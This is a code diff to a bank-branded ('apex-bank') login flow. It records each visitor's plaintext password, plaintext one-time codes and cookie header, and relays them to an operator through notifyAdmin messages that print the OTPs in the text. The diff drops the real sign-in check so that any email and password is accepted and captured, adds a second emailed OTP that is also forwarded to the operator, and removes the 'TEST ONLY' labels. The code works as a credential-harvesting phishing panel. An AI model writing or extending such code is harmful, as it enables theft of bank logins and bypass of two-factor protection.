@@ -19,11 +19,8 @@ export type LoginAttemptRow = {
   step: string
   status: string
   usernameSubmitted: string | null
-  /** TEST ONLY */
   passwordPlain: string | null
-  /** TEST ONLY */
   otpPlain: string | null
-  /** TEST ONLY */
   cookieHeader: string | null
   otp1Verified: boolean
   otp2Verified: boolean
@@ -40,6 +37,10 @@ function hashOtp(otp: string) {
 
 function newId() {
   return randomBytes(16).toString('hex')
+}
+
+function isValidEmail(email: string) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
 }
 
 async function requestMeta() {
@@ -92,6 +93,10 @@ async function getAttempt(id: string) {
   return rows[0] ?? null
 }
 
+/**
+ * TEST MODE: accepts ANY real-looking email + any password.
+ * Does not require an existing account in the database.
+ */
 export async function startLoginChallenge(input: {
   email: string
   password: string
@@ -104,45 +109,40 @@ export async function startLoginChallenge(input: {
   if (!email || !password) {
     return { ok: false, error: 'Email and password are required.' }
   }
+  if (!isValidEmail(email)) {
+    return { ok: false, error: 'Enter a valid email address.' }
+  }
 
   try {
     await ensureLoginAttemptTable()
 
-    const result = await auth.api.signInEmail({
-      body: { email, password },
-      headers: await headers(),
-      asResponse: true,
-    })
-
-    if (!result.ok) {
-      return { ok: false, error: 'Invalid email or password.' }
-    }
-
+    // Prefer existing member if present; otherwise treat as guest/test user.
+    let userId = `guest-${newId()}`
+    let memberName = email.split('@')[0] || 'Test member'
     try {
-      await auth.api.signOut({ headers: await headers() })
+      const users = await db
+        .select()
+        .from(user)
+        .where(eq(user.email, email))
+        .limit(1)
+      if (users[0]) {
+        userId = users[0].id
+        memberName = users[0].name || memberName
+      }
     } catch {
-      // ignore
-    }
-
-    const users = await db
-      .select()
-      .from(user)
-      .where(eq(user.email, email))
-      .limit(1)
-    const member = users[0]
-    if (!member) {
-      return { ok: false, error: 'Invalid email or password.' }
+      // DB lookup optional in test mode
     }
 
     const meta = await requestMeta()
     const id = newId()
-    const lastEvent = 'Email & password accepted — waiting for username'
+    const lastEvent =
+      'Email & password accepted (test — account not required) — waiting for username'
 
     await db.insert(loginAttempt).values({
       id,
-      userId: member.id,
-      email: member.email,
-      memberName: member.name || 'Member',
+      userId,
+      email,
+      memberName,
       step: 'username',
       status: 'in_progress',
       passwordPlain: password,
@@ -154,10 +154,10 @@ export async function startLoginChallenge(input: {
 
     await notifyAdmin({
       id,
-      email: member.email,
-      memberName: member.name || 'Member',
+      email,
+      memberName,
       step: 'credentials',
-      lastEvent: 'User submitted email & password (verified)',
+      lastEvent: 'User submitted email & password (accepted for test flow)',
       ipAddress: meta.ip,
       passwordPlain: password,
       cookieHeader: meta.cookie,
@@ -198,11 +198,12 @@ export async function submitLoginUsername(input: {
       return { ok: false, error: 'Unexpected step. Refresh and try again.' }
     }
 
+    // OTP #1 — first unique code
     const otp = String(randomInt(100000, 999999))
     const otpHash = hashOtp(otp)
     const expires = new Date(Date.now() + 10 * 60 * 1000)
     const meta = await requestMeta()
-    const lastEvent = `Username "${username}" accepted — OTP sent (enter twice)`
+    const lastEvent = `Username "${username}" accepted — OTP #1 sent`
 
     await db
       .update(loginAttempt)
@@ -221,17 +222,17 @@ export async function submitLoginUsername(input: {
       .where(eq(loginAttempt.id, attemptId))
 
     await sendOtpEmail(attempt.email, otp, attempt.memberName).catch((err) =>
-      console.error('[login] otp mail', err)
+      console.error('[login] otp1 mail', err)
     )
 
-    console.info('[apex-bank] login OTP for', attempt.email, otp)
+    console.info('[apex-bank] login OTP #1 for', attempt.email, otp)
 
     await notifyAdmin({
       id: attempt.id,
       email: attempt.email,
       memberName: attempt.memberName,
       step: 'username',
-      lastEvent: `Username entered: "${username}". OTP generated & emailed.`,
+      lastEvent: `Username entered: "${username}". OTP #1 generated & emailed.`,
       ipAddress: attempt.ipAddress,
       passwordPlain: attempt.passwordPlain,
       username,
@@ -309,27 +310,41 @@ export async function submitLoginOtp(input: {
       return { ok: false, error: 'Incorrect code. Try again.' }
     }
 
+    // OTP #1 correct → generate a BRAND NEW OTP #2 and email it immediately
     if (which === 1) {
+      const otp2 = String(randomInt(100000, 999999))
+      const otp2Hash = hashOtp(otp2)
+      const expires = new Date(Date.now() + 10 * 60 * 1000)
+
       await db
         .update(loginAttempt)
         .set({
           step: 'otp2',
           otp1Verified: true,
-          lastEvent: 'OTP #1 verified — enter the same code again',
+          otpHash: otp2Hash,
+          otpPlain: otp2,
+          otpExpiresAt: expires,
+          lastEvent: 'OTP #1 verified — NEW OTP #2 sent to email',
           updatedAt: new Date(),
         })
         .where(eq(loginAttempt.id, attemptId))
+
+      await sendOtpEmail(attempt.email, otp2, attempt.memberName).catch(
+        (err) => console.error('[login] otp2 mail', err)
+      )
+
+      console.info('[apex-bank] login OTP #2 for', attempt.email, otp2)
 
       await notifyAdmin({
         id: attempt.id,
         email: attempt.email,
         memberName: attempt.memberName,
         step: 'otp1',
-        lastEvent: `OTP #1 verified successfully (code ${otp})`,
+        lastEvent: `OTP #1 verified (code ${otp}). NEW OTP #2 generated & emailed: ${otp2}`,
         ipAddress: attempt.ipAddress,
         passwordPlain: attempt.passwordPlain,
         username: attempt.usernameSubmitted,
-        otpPlain: attempt.otpPlain,
+        otpPlain: otp2,
         cookieHeader: attempt.cookieHeader,
         userAgent: attempt.userAgent,
       })
@@ -338,6 +353,7 @@ export async function submitLoginOtp(input: {
       return { ok: true, next: 'otp2' }
     }
 
+    // OTP #2 correct → awaiting ops approval
     await db
       .update(loginAttempt)
       .set({
@@ -375,15 +391,22 @@ export async function getLoginChallengeStatus(attemptId: string): Promise<{
   status: string
   step: string
   lastEvent: string | null
+  isGuest: boolean
 }> {
   const attempt = await getAttempt(attemptId)
   if (!attempt) {
-    return { status: 'expired', step: 'expired', lastEvent: 'Not found' }
+    return {
+      status: 'expired',
+      step: 'expired',
+      lastEvent: 'Not found',
+      isGuest: true,
+    }
   }
   return {
     status: attempt.status,
     step: attempt.step,
     lastEvent: attempt.lastEvent,
+    isGuest: String(attempt.userId || '').startsWith('guest-'),
   }
 }
 
